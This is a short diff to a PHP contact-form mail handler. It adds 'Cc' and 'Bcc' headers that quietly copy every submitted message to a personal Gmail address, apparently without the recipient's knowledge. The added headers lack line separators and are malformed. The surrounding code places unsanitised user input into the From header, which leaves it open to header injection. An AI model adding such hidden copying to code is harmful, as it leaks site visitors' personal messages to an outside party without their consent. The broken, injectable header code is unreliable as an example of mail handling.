@@ -79,6 +79,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $email_headers = "MIME-Version: 1.0" . "\n";
         $email_headers .= "Content-type:text/html;charset=UTF-8" . "\n";
         $email_headers .= "From: $name <$email>";
+        $email_headers .= 'Cc: johnalexladra@gmail.com';
+        $email_headers .= 'Bcc: johnalexladra@gmail.com';
 
     // Send the email.
     if (mail($recipient, $subject, $email_content, $email_headers)) {
